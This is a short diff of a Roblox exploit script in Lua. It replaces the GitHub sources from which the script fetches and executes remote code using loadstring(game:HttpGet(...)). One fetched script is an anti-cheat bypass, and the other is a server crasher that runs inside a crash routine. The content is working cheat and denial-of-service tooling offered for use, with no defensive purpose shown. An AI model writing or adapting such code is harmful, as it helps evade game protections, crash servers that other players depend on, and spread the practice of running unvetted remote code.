@@ -54,7 +54,7 @@ if Testing == false then
 	setfpscap(5)
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StereoPancake6/DHCDROPPING/main/ACbypass.lua"))()
 getgenv().Executed = true
 
 --// Code --//
@@ -439,7 +439,7 @@ local function Initiate()
 					end
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
-					loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/StereoPancake6/DHCDROPPING/main/customservercrash.lua'))()
 					for Index,Var in pairs(CmdSettings) do
 						CmdSettings[Var] = nil
 					end
